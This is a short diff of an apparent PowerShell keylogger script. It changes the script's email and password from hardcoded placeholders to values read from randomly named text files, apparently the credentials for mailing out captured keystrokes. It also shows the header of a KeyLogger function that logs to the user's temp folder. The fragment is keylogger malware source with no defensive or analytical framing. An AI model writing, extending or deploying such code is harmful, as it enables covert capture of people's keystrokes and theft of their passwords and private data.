@@ -1,5 +1,5 @@
-$email = "example@gmail.com"
-$password = "password"
+$email = Get-Content XbrMzmCUiE.txt
+$password = Get-Content UJbMLjTIDr.txt
 
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
